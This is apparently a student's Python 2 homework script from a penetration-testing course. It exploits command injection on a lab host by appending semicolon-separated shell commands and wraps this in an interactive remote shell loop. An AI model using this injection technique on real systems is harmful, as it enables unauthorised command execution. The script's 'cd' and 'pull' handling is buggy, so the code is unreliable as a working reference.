# Tuan Le
# CMSC 389R (0201)
# 4_Pentesting_I

import socket
import sys

# IP address
host = "1337bank.money"

# Port
port = 1337

# Sockets: https://docs.python.org/2/library/socket.html

def execute_cmd(cmd):

    if cmd.split(" ")[0] == "cd":
        
        cd_dir = cmd 
        dir = cmd.split(" ")[1]

        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Reading from socket
        data = s.recv(1024)   # Receives 1024 bytes from IP/Port

        s.send(host + ";" + cmd + ";\n")

        data2 = s.recv(4096)
        data3 = s.recv(4096)
        print(data3)

        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Reading from socket
        data = s.recv(1024)   # Receives 1024 bytes from IP/Port

        s.send(host + ";" + cd_dir + cmd + ";\n")
        
    else:

        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Reading from socket
        data = s.recv(1024)   # Receives 1024 bytes from IP/Port

        s.send(host + ";" + cmd + ";\n")

        data2 = s.recv(4096)
        data3 = s.recv(4096)
        print(data3)
        
if __name__ == '__main__':

    cmd = raw_input("")

    if cmd == "quit":
        sys.exit(0)

    elif cmd == "shell":
        while True:
            cmd2 = raw_input("")
            execute_cmd(cmd2)

    elif cmd == "pull":
        execute_cmd("pull")

    elif cmd == "help":
        print("The following are valid commands:")
        print("1. shell    Drop into an interactive shell and allow users to exit")
        print("2. pull     Download files")
        print("3. help     Shows this help menu")
        print("4. quit     Quit the shell")

